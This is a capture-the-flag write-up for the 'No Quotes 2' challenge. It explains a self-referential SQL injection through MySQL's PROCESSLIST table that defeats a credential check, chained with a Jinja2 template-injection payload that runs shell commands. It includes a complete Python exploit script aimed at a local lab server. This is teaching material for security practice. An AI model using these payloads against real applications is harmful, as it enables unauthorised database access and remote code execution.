# UofTCTF – No Quotes 2 (Write-Up)

## Challenge Overview

**No Quotes 2** is the sequel to the original challenge, adding a critical validation layer that breaks our previous exploit. The WAF and SSTI vulnerabilities remain identical, but now the application validates that our injected SQL results match exactly what we submitted.

---

## The New Defense
```python
if not username == row[0] or not password == row[1]:
    return render_template(
        "login.html",
        error="Invalid credentials.",
        username=username,
    )
```

After executing the SQL query, the application performs strict equality checks:
- Submitted username must equal `row[0]`
- Submitted password must equal `row[1]`

### Why Our Previous Exploit Fails

Our original payload returned arbitrary values via UNION:
```sql
) UNION SELECT 1, <SSTI_payload>--
```

This gave us:
- `row[0]` = `1`
- `row[1]` = SSTI payload

But our submitted username was `\`, not `1`, so the validation fails.

---

## The Core Problem

We need the query to return:
1. Our exact submitted username (containing the SSTI payload)
2. Our exact submitted password (the SQL injection)
3. While still getting the SSTI payload into the session

How do we make the database return values we control, that match what we submitted, without hardcoding them in the query?

---

## Enter INFORMATION_SCHEMA.PROCESSLIST

MySQL's `INFORMATION_SCHEMA.PROCESSLIST` table logs every active query, including:
- **INFO**: The full SQL query text being executed
- **ID**, **USER**, and other metadata

The crucial insight: **we can query PROCESSLIST to read our own query string**, extracting the exact values we injected.

---

## The Attack: Self-Referential SQL Injection

Instead of returning arbitrary values, we extract our inputs directly from the query itself:
```sql
) UNION SELECT 
    CONCAT({usename in char}),  
    SUBSTRING(info, xx, yy)   -- Extract password from query
FROM INFORMATION_SCHEMA.PROCESSLIST--
```

This makes the database return exactly what we submitted, bypassing the validation.

---

## Building the Exploit

### Enhanced SSTI Payload

We use GET parameters to make the payload more flexible:
```jinja2
{{request.application.__globals__.__builtins__.__import__(request.args.f).popen(request.args.cmd).read()}}\
```

The trailing backslash escapes the closing quote, just like in the first challenge.

### SQL Injection Structure

Password field injection:
```sql
) UNION SELECT <CHAR_encoded_username>, SUBSTRING(info,xx,yy) FROM INFORMATION_SCHEMA.PROCESSLIST-- ')
```

Where:
- First column: CHAR-encoded SSTI payload (our username)
- Second column: SUBSTRING that extracts the password from PROCESSLIST

### Calculating Positions

We need to know where in the query our password appears:
```python
# Reconstruct what the full query will look like
all_request = (
    f"SELECT username, password FROM users "
    f"WHERE username = ('{payload}') AND password = ('" + sql_payload
)

# Find where our UNION injection starts
x = all_request.index(") U") + 1  # Start position
y = len(sql_payload) + 1          # Length to extract

# Replace placeholders with calculated values
sql_payload = sql_payload.replace("xx", str(x)).replace("yy", str(y))
```

### Complete Exploit
```python
import requests

URL = "http://172.17.0.2:5000/"
s = requests.Session()

def convert_to_char(payload):
    """Convert string to MySQL CHAR() concatenation"""
    chars = [f"CHAR({ord(c)})" for c in payload]
    return f"CONCAT({','.join(chars)})"

# SSTI payload with GET parameter injection
payload = "{{request.application.__globals__.__builtins__.__import__(request.args.f).popen(request.args.cmd).read()}}\\"

# Encode to bypass quote filter
convert_payload = convert_to_char(payload)

# SQL injection with SUBSTRING for password extraction
sql_payload = (
    ") UNION SELECT " + convert_payload + 
    ",SUBSTRING(info,xx,yy) FROM INFORMATION_SCHEMA.PROCESSLIST-- ')"
)

# Calculate substring positions
all_request = (
    f"SELECT username, password FROM users "
    f"WHERE username = ('{payload}') AND password = ('" + sql_payload
)

x = all_request.index(") U") + 1
y = len(sql_payload) + 1

sql_payload = sql_payload.replace("xx", str(x)).replace("yy", str(y))

# Execute attack
data = {"username": payload, "password": sql_payload}
s.post(URL + "login", data=data)

# Trigger SSTI via GET parameters
response = s.get(URL + "home?f=os&cmd=/readflag")
print(response.text)
```

---

## Exploitation Flow

1. **Username field**: SSTI payload with trailing backslash
2. **Password field**: UNION injection querying PROCESSLIST
3. **Query execution**: MySQL logs the query in PROCESSLIST
4. **SUBSTRING extraction**: Pulls the exact password value from the query INFO
5. **Validation bypass**: Comparison succeeds because we return exactly what was submitted
6. **Session storage**: SSTI payload stored as username
7. **Template rendering**: `/home` processes our Jinja2 syntax
8. **RCE**: Execute `/readflag` via GET parameters

---

## Why This Works

The query reads itself from MySQL's internal state:
```sql
SELECT username, password FROM users 
WHERE username = ('{{SSTI}}\') AND password = (') UNION SELECT 
  CONCAT(CHAR(123),...),      -- Our SSTI payload
  SUBSTRING(info, 95, 200)    -- The UNION statement itself
FROM INFORMATION_SCHEMA.PROCESSLIST-- ')')
```

Result:
- `row[0]` = Our SSTI payload
- `row[1]` = Our UNION statement

Both match what we submitted, so validation passes. The application validates our injected data against itself, making the check useless.